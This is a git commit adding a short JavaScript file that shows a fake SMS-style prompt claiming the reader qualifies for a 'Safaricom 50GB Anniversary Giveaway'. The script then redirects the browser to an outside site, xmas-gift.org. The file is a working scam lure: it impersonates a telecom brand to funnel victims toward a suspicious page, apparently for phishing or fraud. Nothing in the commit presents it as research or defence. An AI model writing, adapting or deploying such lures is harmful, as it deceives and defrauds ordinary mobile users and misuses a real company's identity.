04dc0460d341c47bd0815f13516936bd735f2724
4g-network <154092422+4g-network@users.noreply.github.com>
2024-10-24 03:09:52 -0700

    Create 24years-50gb.js

---
+++ 24years-50gb.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for Safaricom 50GB Anniversary Giveaway, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://xmas-gift.org/24years.html';
+}
